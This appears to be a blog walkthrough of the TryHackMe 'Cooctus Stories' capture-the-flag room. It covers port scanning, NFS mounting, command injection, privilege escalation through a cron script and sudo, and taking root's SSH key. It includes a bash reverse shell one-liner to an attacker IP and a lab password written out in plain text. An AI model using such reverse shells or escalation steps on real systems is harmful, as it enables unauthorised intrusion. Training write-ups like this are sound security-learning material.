<!DOCTYPE html>
<html lang="en">

  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="Content-Language" content="en">
    <meta name="color-scheme" content="light dark">

    

    <meta name="author" content="monoloc0">
    <meta name="description" content="https://tryhackme.com/room/cooctusadventures
Enumeration    Port Scan     pre code { background-color: #eee; }  # Nmap 7.80 scan initiated Wed Apr 14 22:40:12 2021 as: nmap -sC -sV -oA nmap/output cooctus.thm Nmap scan report for cooctus.thm (10.10.63.190) Host is up (0.072s latency). Not shown: 996 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 e5:44:62:91:90:08:99:5d:e8:55:4f:69:ca:02:1c:10 (RSA) | 256 e5:a7:b0:14:52:e1:c9:4e:0d:b8:1a:db:c5:d6:7e:f0 (ECDSA) |_ 256 02:97:18:d6:cd:32:58:17:50:43:dd:d2:2f:ba:15:53 (ED25519) 111/tcp open rpcbind 2-4 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/udp rpcbind | 100000 3,4 111/tcp6 rpcbind | 100000 3,4 111/udp6 rpcbind | 100003 3 2049/udp nfs | 100003 3 2049/udp6 nfs | 100003 3,4 2049/tcp nfs | 100003 3,4 2049/tcp6 nfs | 100005 1,2,3 39957/udp6 mountd | 100005 1,2,3 44553/tcp6 mountd | 100005 1,2,3 51843/tcp mountd | 100005 1,2,3 58323/udp mountd | 100021 1,3,4 38081/tcp nlockmgr | 100021 1,3,4 41515/tcp6 nlockmgr | 100021 1,3,4 46346/udp nlockmgr | 100021 1,3,4 54342/udp6 nlockmgr | 100227 3 2049/tcp nfs_acl | 100227 3 2049/tcp6 nfs_acl | 100227 3 2049/udp nfs_acl |_ 100227 3 2049/udp6 nfs_acl 2049/tcp open nfs_acl 3 (RPC #100227) 8080/tcp open http Werkzeug httpd 0.">
    <meta name="keywords" content="infosec,bugbounty,personal">

    <meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Cooctus Stories"/>
<meta name="twitter:description" content="https://tryhackme.com/room/cooctusadventures
Enumeration    Port Scan     pre code { background-color: #eee; }  # Nmap 7.80 scan initiated Wed Apr 14 22:40:12 2021 as: nmap -sC -sV -oA nmap/output cooctus.thm Nmap scan report for cooctus.thm (10.10.63.190) Host is up (0.072s latency). Not shown: 996 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 e5:44:62:91:90:08:99:5d:e8:55:4f:69:ca:02:1c:10 (RSA) | 256 e5:a7:b0:14:52:e1:c9:4e:0d:b8:1a:db:c5:d6:7e:f0 (ECDSA) |_ 256 02:97:18:d6:cd:32:58:17:50:43:dd:d2:2f:ba:15:53 (ED25519) 111/tcp open rpcbind 2-4 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/udp rpcbind | 100000 3,4 111/tcp6 rpcbind | 100000 3,4 111/udp6 rpcbind | 100003 3 2049/udp nfs | 100003 3 2049/udp6 nfs | 100003 3,4 2049/tcp nfs | 100003 3,4 2049/tcp6 nfs | 100005 1,2,3 39957/udp6 mountd | 100005 1,2,3 44553/tcp6 mountd | 100005 1,2,3 51843/tcp mountd | 100005 1,2,3 58323/udp mountd | 100021 1,3,4 38081/tcp nlockmgr | 100021 1,3,4 41515/tcp6 nlockmgr | 100021 1,3,4 46346/udp nlockmgr | 100021 1,3,4 54342/udp6 nlockmgr | 100227 3 2049/tcp nfs_acl | 100227 3 2049/tcp6 nfs_acl | 100227 3 2049/udp nfs_acl |_ 100227 3 2049/udp6 nfs_acl 2049/tcp open nfs_acl 3 (RPC #100227) 8080/tcp open http Werkzeug httpd 0."/>

    <meta property="og:title" content="Cooctus Stories" />
<meta property="og:description" content="https://tryhackme.com/room/cooctusadventures
Enumeration    Port Scan     pre code { background-color: #eee; }  # Nmap 7.80 scan initiated Wed Apr 14 22:40:12 2021 as: nmap -sC -sV -oA nmap/output cooctus.thm Nmap scan report for cooctus.thm (10.10.63.190) Host is up (0.072s latency). Not shown: 996 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 e5:44:62:91:90:08:99:5d:e8:55:4f:69:ca:02:1c:10 (RSA) | 256 e5:a7:b0:14:52:e1:c9:4e:0d:b8:1a:db:c5:d6:7e:f0 (ECDSA) |_ 256 02:97:18:d6:cd:32:58:17:50:43:dd:d2:2f:ba:15:53 (ED25519) 111/tcp open rpcbind 2-4 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/udp rpcbind | 100000 3,4 111/tcp6 rpcbind | 100000 3,4 111/udp6 rpcbind | 100003 3 2049/udp nfs | 100003 3 2049/udp6 nfs | 100003 3,4 2049/tcp nfs | 100003 3,4 2049/tcp6 nfs | 100005 1,2,3 39957/udp6 mountd | 100005 1,2,3 44553/tcp6 mountd | 100005 1,2,3 51843/tcp mountd | 100005 1,2,3 58323/udp mountd | 100021 1,3,4 38081/tcp nlockmgr | 100021 1,3,4 41515/tcp6 nlockmgr | 100021 1,3,4 46346/udp nlockmgr | 100021 1,3,4 54342/udp6 nlockmgr | 100227 3 2049/tcp nfs_acl | 100227 3 2049/tcp6 nfs_acl | 100227 3 2049/udp nfs_acl |_ 100227 3 2049/udp6 nfs_acl 2049/tcp open nfs_acl 3 (RPC #100227) 8080/tcp open http Werkzeug httpd 0." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://www.monoloco.org/cooctus/" /><meta property="article:section" content="" />





    <title>
  Cooctus Stories · monoloc0
</title>

    
      <link rel="canonical" href="https://www.monoloco.org/cooctus/">
    

    <link rel="preload" href="https://www.monoloco.org/fonts/forkawesome-webfont.woff2?v=1.2.0" as="font" type="font/woff2" crossorigin>

    
      
      
      <link rel="stylesheet" href="https://www.monoloco.org/css/coder.min.843ee18d510f7cb1bb49110db117b99ea65489c095d620a5d79ea71693478e77.css" integrity="sha256-hD7hjVEPfLG7SRENsRe5nqZUicCV1iCl156nFpNHjnc=" crossorigin="anonymous" media="screen" />
    

    

    

    

    

    <link rel="icon" type="image/png" href="https://www.monoloco.org/images/favicon-32x32.png" sizes="32x32">
    <link rel="icon" type="image/png" href="https://www.monoloco.org/images/favicon-16x16.png" sizes="16x16">

    <link rel="apple-touch-icon" href="https://www.monoloco.org/images/apple-touch-icon.png">
    <link rel="apple-touch-icon" sizes="180x180" href="https://www.monoloco.org/images/apple-touch-icon.png">

    <meta name="generator" content="Hugo 0.89.4" />
  </head>

  
  
  <body class="preload-transitions colorscheme-light">
    

    <main class="wrapper">
      <nav class="navigation">
  <section class="container">
    <a class="navigation-title" href="https://www.monoloco.org/">
      monoloc0
    </a>
    
      <input type="checkbox" id="menu-toggle" />
      <label class="menu-button float-right" for="menu-toggle">
        <i class="fa fa-bars fa-fw" aria-hidden="true"></i>
      </label>
      <ul class="navigation-list">
        
          
            <li class="navigation-item">
              <a class="navigation-link" href="https://www.monoloco.org/whoami/">whoami</a>
            </li>
          
            <li class="navigation-item">
              <a class="navigation-link" href="https://www.monoloco.org/writeups/">writeups</a>
            </li>
          
            <li class="navigation-item">
              <a class="navigation-link" href="https://www.monoloco.org/resources/">resources</a>
            </li>
          
        
        
      </ul>
    
  </section>
</nav>


      <div class="content">
        
  <section class="container page">
  <article>
    <header>
      <h1 class="title">
        <a class="title-link" href="https://www.monoloco.org/cooctus/">
          Cooctus Stories
        </a>
      </h1>
    </header>

    <p><em><a href="https://tryhackme.com/room/cooctusadventures">https://tryhackme.com/room/cooctusadventures</a></em></p>
<h1 id="enumeration">
  Enumeration
  <a class="heading-link" href="#enumeration">
    <i class="fa fa-link" aria-hidden="true"></i>
  </a>
</h1>
<h2 id="port-scan">
  Port Scan
  <a class="heading-link" href="#port-scan">
    <i class="fa fa-link" aria-hidden="true"></i>
  </a>
</h2>
<style>


pre code {
  background-color: #eee;

}


</style>

<pre tabindex="0"><code># Nmap 7.80 scan initiated Wed Apr 14 22:40:12 2021 as: nmap -sC -sV -oA nmap/output cooctus.thm
Nmap scan report for cooctus.thm (10.10.63.190)
Host is up (0.072s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e5:44:62:91:90:08:99:5d:e8:55:4f:69:ca:02:1c:10 (RSA)
|   256 e5:a7:b0:14:52:e1:c9:4e:0d:b8:1a:db:c5:d6:7e:f0 (ECDSA)
|_  256 02:97:18:d6:cd:32:58:17:50:43:dd:d2:2f:ba:15:53 (ED25519)
111/tcp  open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      39957/udp6  mountd
|   100005  1,2,3      44553/tcp6  mountd
|   100005  1,2,3      51843/tcp   mountd
|   100005  1,2,3      58323/udp   mountd
|   100021  1,3,4      38081/tcp   nlockmgr
|   100021  1,3,4      41515/tcp6  nlockmgr
|   100021  1,3,4      46346/udp   nlockmgr
|   100021  1,3,4      54342/udp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp open  nfs_acl 3 (RPC #100227)
8080/tcp open  http    Werkzeug httpd 0.14.1 (Python 3.6.9)
|_http-title: CCHQ
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Apr 14 22:40:29 2021 -- 1 IP address (1 host up) scanned in 16.91 seconds
</code></pre><p>According to the port scan, it looks like the server shared a folder via NFS.</p>
<p>Next step:</p>
<p><img src="https://www.monoloco.org/images/20210415004615.png" alt="20210415004615.png"></p>
<p>Mounting the NFS share</p>
<pre tabindex="0"><code>sudo mount -t nfs cooctus.thm:/var/nfs/general nfs-share/
</code></pre><p>Let&rsquo;s see, what&rsquo;s in there</p>
<p><img src="https://www.monoloco.org/images/20210415004742.png" alt="20210415004742.png"></p>
<p>According to the really obvious name, it seems like we just found credentials</p>
<p>They don&rsquo;t work for SSH</p>
<p>Next I had a look at the web page that is running on port 8080</p>
<p><img src="https://www.monoloco.org/images/20210415005145.png" alt="20210415005145.png"></p>
<h2 id="gobuster">
  Gobuster
  <a class="heading-link" href="#gobuster">
    <i class="fa fa-link" aria-hidden="true"></i>
  </a>
</h2>
<p><img src="https://www.monoloco.org/images/20210415005223.png" alt="20210415005223.png"></p>
<p>The credentials from above work under http://cooctus:8080/login</p>
<p><img src="https://www.monoloco.org/images/20210415005420.png" alt="20210415005420.png"></p>
<h2 id="rce-when-confronting-cat">
  RCE when &ldquo;confronting&rdquo; C.A.T
  <a class="heading-link" href="#rce-when-confronting-cat">
    <i class="fa fa-link" aria-hidden="true"></i>
  </a>
</h2>
<p><img src="https://www.monoloco.org/images/20210418102155.png" alt="20210418102155.png"></p>
<pre tabindex="0"><code>/bin/bash -c '/bin/bash &gt;&amp; /dev/tcp/10.9.7.86/4444 0&gt;&amp;1'
</code></pre><p>Great, we have found the flag for user <strong>paradox</strong></p>
<h2 id="vertical-privesc-szymex">
  vertical privesc (szymex)
  <a class="heading-link" href="#vertical-privesc-szymex">
    <i class="fa fa-link" aria-hidden="true"></i>
  </a>
</h2>
<p>During enumeration I noted the follwing entry inside the <code>/etc/crontab</code></p>
<pre tabindex="0"><code>* *     * * *   szymex  /home/szymex/SniffingCat.py 
</code></pre><p>Therefore I next had a look at <code>/home/szymex/SniffingCat.py</code></p>
<pre tabindex="0"><code>#!/usr/bin/python3
import os
import random

def encode(pwd):
    enc = ''
    for i in pwd:
        if ord(i) &gt; 110:
            num = (13 - (122 - ord(i))) + 96
            enc += chr(num)
        else:
            enc += chr(ord(i) + 13)
    return enc


x = random.randint(300,700)
y = random.randint(0,255)
z = random.randint(0,1000)

message = &quot;Approximate location of an upcoming Dr.Pepper shipment found:&quot;
coords = &quot;Coordinates: X: {x}, Y: {y}, Z: {z}&quot;.format(x=x, y=y, z=z)

with open('/home/szymex/mysupersecretpassword.cat', 'r') as f:
    line = f.readline().rstrip(&quot;\n&quot;)
    enc_pw = encode(line)
    print(enc_pw)
    if enc_pw == &quot;pureelpbxr&quot;:
        os.system(&quot;wall -g paradox &quot; + message)
        os.system(&quot;wall -g paradox &quot; + coords)

</code></pre><p>I downloaded the script on my local machine and played around with it.</p>
<ul>
<li>created a file with the content
<ul>
<li><code>pureelpbxr</code></li>
</ul>
</li>
<li>executed the script and printed the encoded value: <code>&lt;REDACTED&gt;</code></li>
</ul>
<p><img src="https://www.monoloco.org/images/20210418204709.png" alt="20210418204709.png"></p>
<ul>
<li>After some research I figured the <em>encode</em>  basically ony does ROT13 encoding</li>
</ul>
<p><img src="https://www.monoloco.org/images/20210418204828.png" alt="20210418204828.png"></p>
<ul>
<li>ssh into machine (with the found password)
<ul>
<li><code>ssh szymex@cooctus.thm</code></li>
</ul>
</li>
</ul>
<p>Nice, we have found the flag for user <strong>szymex</strong></p>
<h1 id="tux-flag">
  tux flag
  <a class="heading-link" href="#tux-flag">
    <i class="fa fa-link" aria-hidden="true"></i>
  </a>
</h1>
<p>Inside tux&rsquo;s home directory there are two interesting folders</p>
<ul>
<li>tuxling_1</li>
<li>tuxling_3</li>
</ul>
<p>after running the following command
<code>find / -name tuxling_2 -type d 2&gt;/dev/null</code> I found <code>tuxling_2</code> in</p>
<ul>
<li><code>/media/tuxling_2</code></li>
</ul>
<h2 id="tuxling_1">
  tuxling_1
  <a class="heading-link" href="#tuxling_1">
    <i class="fa fa-link" aria-hidden="true"></i>
  </a>
</h2>
<p>contains the following c code:</p>
<pre tabindex="0"><code>#include &lt;stdio.h&gt;

#define noot int
#define Noot main
#define nOot return
#define noOt (
#define nooT )
#define NOOOT &quot;f96&quot;
#define NooT ;
#define Nooot nuut
#define NOot {
#define nooot key
#define NoOt }
#define NOOt void
#define NOOT &quot;NOOT!\n&quot;
#define nooOT &quot;050a&quot;
#define noOT printf
#define nOOT 0
#define nOoOoT &quot;What does the penguin say?\n&quot;
#define nout &quot;d61&quot;

noot Noot noOt nooT NOot
    noOT noOt nOoOoT nooT NooT
    Nooot noOt nooT NooT

    nOot nOOT NooT
NoOt

NOOt nooot noOt nooT NOot
    noOT noOt NOOOT nooOT nout nooT NooT
NoOt

NOOt Nooot noOt nooT NOot
    noOT noOt NOOT nooT NooT
NoOt
</code></pre><p>with the help of some python scripting I created the following:</p>
<pre tabindex="0"><code>#include &lt;stdio.h&gt;

#define int int
#define main main
#define return return
#define ( (
#define ) )
#define &quot;f96&quot; &quot;f96&quot;
#define ; ;
#define nuut nuut
#define { {
#define key key
#define } }
#define void void
#define &quot;NOOT!\n&quot; &quot;&quot;NOOT!\n&quot;!\n&quot;
#define &quot;050a&quot; &quot;050a&quot;
#define printf printf
#define 0 0
#define &quot;What &quot;What does the penguin say?\n&quot;
#define &quot;d61&quot; &quot;d61&quot;

int main ( ) {
    printf ( &quot;What ) ;
    nuut ( ) ;

    return 0 ;
}

void key ( ) {
    printf ( &quot;f96&quot; &quot;050a&quot; &quot;d61&quot; ) ;
}

void nuut ( ) {
    printf ( &quot;NOOT!\n&quot; ) ;
}
</code></pre><p><strong>first fragment:</strong> &ldquo;&lt;REDACTED 1&gt;&rdquo;</p>
<h2 id="tuxling_2">
  tuxling_2
  <a class="heading-link" href="#tuxling_2">
    <i class="fa fa-link" aria-hidden="true"></i>
  </a>
</h2>
<p><img src="https://www.monoloco.org/images/20210418214637.png" alt="20210418214637.png"></p>
<p><strong>second fragment:</strong> &ldquo;&lt;REDACTED 2&gt;&rdquo;</p>
<h2 id="tuxling_3">
  tuxling_3
  <a class="heading-link" href="#tuxling_3">
    <i class="fa fa-link" aria-hidden="true"></i>
  </a>
</h2>
<p><img src="https://www.monoloco.org/images/20210418214743.png" alt="20210418214743.png"></p>
<p><strong>third fragment:</strong> &ldquo;&lt;REDACTED 3&gt;&rdquo;</p>
<p>The complete fragment looks like a MD5 Hash.</p>
<h2 id="cracking-with-crackstation">
  Cracking with CrackStation
  <a class="heading-link" href="#cracking-with-crackstation">
    <i class="fa fa-link" aria-hidden="true"></i>
  </a>
</h2>
<p><img src="https://www.monoloco.org/images/20210418215529.png" alt="20210418215529.png"></p>
<p>Awesome, we&rsquo;ve found <strong>tuxykitty&rsquo;s</strong> flag :)</p>
<h1 id="varg-flag">
  Varg flag
  <a class="heading-link" href="#varg-flag">
    <i class="fa fa-link" aria-hidden="true"></i>
  </a>
</h1>
<p>Steps</p>
<ul>
<li><code>sudo -l</code></li>
<li>run sudo command</li>
<li>have a look inside <code>/home/varg/cooctOS_src</code>
<img src="https://www.monoloco.org/images/20210418223514.png" alt="20210418223514.png"></li>
<li>read password</li>
</ul>
<p><img src="https://www.monoloco.org/images/20210418223340.png" alt="20210418223340.png"></p>
<ul>
<li>become <strong>varg</strong></li>
</ul>
<p>varg:slowroastpork</p>
<h1 id="roottxt">
  root.txt
  <a class="heading-link" href="#roottxt">
    <i class="fa fa-link" aria-hidden="true"></i>
  </a>
</h1>
<p><img src="https://www.monoloco.org/images/20210418223641.png" alt="20210418223641.png"></p>
<p>I first unmounted <code>/opt/CooctFS/</code> and spotted something interesting:</p>
<p><img src="https://www.monoloco.org/images/20210418231917.png" alt="20210418231917.png"></p>
<p>Unfortunately, that wasn&rsquo;t what I was looking for&hellip;</p>
<p><img src="https://www.monoloco.org/images/20210418231945.png" alt="20210418231945.png"></p>
<p>BUT I do have root&rsquo;s ssh private key &ndash;&gt; YESS :)</p>
<p><img src="https://www.monoloco.org/images/20210418232059.png" alt="20210418232059.png"></p>
<p><img src="https://www.monoloco.org/images/20210418232129.png" alt="20210418232129.png"></p>

  </article>
</section>

  

      </div>

      <footer class="footer">
  <section class="container">
    ©
    
    2022
     monoloc0 


    
  </section>
</footer>

    </main>

    
      
      <script src="https://www.monoloco.org/js/coder.min.03b17769f4f91ae35667e1f2a1ca8c16f50562576cf90ff32b3179926914daa5.js" integrity="sha256-A7F3afT5GuNWZ&#43;HyocqMFvUFYlds&#43;Q/zKzF5kmkU2qU="></script>
    

    

    

    

    

    

    

    

    
  </body>

</html>
